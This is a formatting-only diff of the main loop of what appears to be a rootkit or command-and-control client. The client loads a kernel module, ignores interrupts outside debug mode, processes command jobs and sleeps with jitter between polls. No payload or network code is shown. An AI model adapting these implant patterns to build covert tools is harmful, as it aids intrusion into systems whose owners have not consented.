@@ -1,9 +1,9 @@
 #include "inc/client.h"
-#include "inc/kernel.h"
 #include "inc/cmds.h"
-#include "inc/util.h"
-#include "inc/save.h"
 #include "inc/job.h"
+#include "inc/kernel.h"
+#include "inc/save.h"
+#include "inc/util.h"
 
 #include <stdbool.h>
 #include <strings.h>
@@ -39,25 +39,25 @@
 
 // clang-format on
 
-bool should_jitter = true;
-bool should_quit = false;
-job_t *job = NULL;
+bool   should_jitter = true;
+bool   should_quit   = false;
+job_t *job           = NULL;
 
-void cleanup(){
+void cleanup() {
   // we are done, free/cleanup stuff
   save_close();
   job_free(job);
-  
+
   // we can remove the kernel module if we are in debug mode
-  if(SHRK_DEBUG)
+  if (SHRK_DEBUG)
     kernel_unload();
 }
 
-void handler(int sig){
+void handler(int sig) {
   // interrupt can be ignored if we are not running in debug mode
-  if(!SHRK_DEBUG && SIGINT == sig)
+  if (!SHRK_DEBUG && SIGINT == sig)
     return;
-    
+
   debug("got a signal (%d), quitting", sig);
   cleanup();
   exit(1);
@@ -71,10 +71,10 @@ int main() {
   client_t _client, *client = &_client;
   job_t    _job;
 
-  job       = &_job;
+  job = &_job;
 
   // load the kernel module
-  if(!kernel_load())
+  if (!kernel_load())
     return EXIT_FAILURE;
 
   // initializtion
@@ -96,7 +96,7 @@ int main() {
     cmd_handle(job);
 
   next:
-    if(should_jitter && !should_quit)
+    if (should_jitter && !should_quit)
       jitter();
     else
       should_jitter = true;
